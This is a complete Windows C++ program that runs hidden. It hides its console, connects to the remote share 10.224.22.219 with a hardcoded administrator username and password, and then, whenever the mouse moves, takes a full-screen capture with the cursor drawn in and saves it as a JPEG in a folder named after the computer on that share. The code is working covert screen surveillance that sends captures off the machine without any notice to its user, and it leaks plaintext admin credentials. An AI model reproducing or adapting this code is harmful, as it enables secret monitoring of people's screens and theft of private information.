#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <atlimage.h>
#include <time.h>
#include <winbase.h>
#include <direct.h>
#include <conio.h>
using namespace std;
int mouse2 = 0;
static TCHAR szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
static DWORD dwSize = MAX_COMPUTERNAME_LENGTH + 1;
CString GetTime() {
	GetComputerName(szBuffer, &dwSize);
	CString PCName = szBuffer;
	time_t t = time(0);
	struct tm* now = localtime(&t);
	char timefolder[80];
	char timename[80];
	strftime(timename, 80, "%Y-%m-%d %H_%M_%S", now);
	strftime(timefolder, 80, "%m_%d_%H", now);
	CString PathPCName = L"\\\\10.224.22.219\\Screen\\" + PCName;
	CString Foldername = L"\\\\10.224.22.219\\Screen\\" + PCName + "\\" + timefolder;
	CString totalename = L"\\\\10.224.22.219\\Screen\\" + PCName + "\\" + timefolder + "\\" + timename + ".jpg";
	CW2A CFoldername(Foldername);
	CW2A CPathPCName(PathPCName);
	if (_mkdir(CPathPCName) == 0);
	if (_mkdir(CFoldername) == 0);
	return totalename;
}
void ScreenShot(LPCTSTR s)
{
	POINT pt;
	BOOL bReturn = GetCursorPos(&pt);
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	HDC hdcMem = CreateCompatibleDC(hdc);
	CImage image;
	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	int heigth = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	HBITMAP hbitmap(NULL);
	hbitmap = CreateCompatibleBitmap(hdc, width, heigth);
	SelectObject(hdcMem, hbitmap);
	BitBlt(hdcMem, 0, 0, width, heigth, hdc, 0, 0, SRCCOPY);
	int nBitPerPixel = GetDeviceCaps(hdcMem, BITSPIXEL);
	image.Create(width, heigth, nBitPerPixel);
	HICON hIcon;
	hIcon = (HICON)LoadImage(NULL, L"C:\\screenshotc++\\cursor.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE | LR_DEFAULTSIZE | LR_SHARED);
	DrawIcon(hdcMem, pt.x, pt.y, hIcon);
	BitBlt(image.GetDC(), 0, 0, width, heigth, hdcMem, 0, 0, SRCCOPY);
	ReleaseDC(NULL, hdcMem);
	image.ReleaseDC();
	image.Save(s, Gdiplus::ImageFormatJPEG);
}
int Xmouseposition() {
	POINT pt;
	BOOL bReturn = GetCursorPos(&pt);
	int x = pt.x;
	return x;
}
int Ymouseposition() {
	POINT pt;
	BOOL bReturn = GetCursorPos(&pt);
	int y = pt.y;
	return y;
}
int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	system("NET USE \\\\10.224.22.219 /user:fileserver19\\administrator !qaz2wsx");
	while (true)
	{
		int Xmouse1 = Xmouseposition();
		int Ymouse1 = Ymouseposition();
		int mouse1 = Xmouse1 + Ymouse1;
		if (mouse1 == mouse2)
		{
			Sleep(1000);
		}
		else
		{
			CString totalename = GetTime();
			ScreenShot((LPCTSTR)(CString)totalename);
			mouse2 = mouse1;
			Sleep(2000);
		}
	}
}